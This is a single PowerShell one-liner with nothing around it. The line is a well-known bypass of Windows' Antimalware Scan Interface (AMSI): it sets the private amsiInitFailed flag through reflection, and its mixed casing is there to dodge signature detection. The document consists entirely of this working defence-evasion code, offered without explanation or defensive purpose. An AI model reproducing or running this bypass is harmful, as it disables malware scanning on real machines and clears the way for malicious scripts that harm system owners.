$ReF=[ReF].AsSemBlY.GEtTypE('System.Management.Automation.AmsiUtils'); $Ref.GetFIElD('amsiInitFailed','NonPublic,Static').SETValue($NULl,$truE);
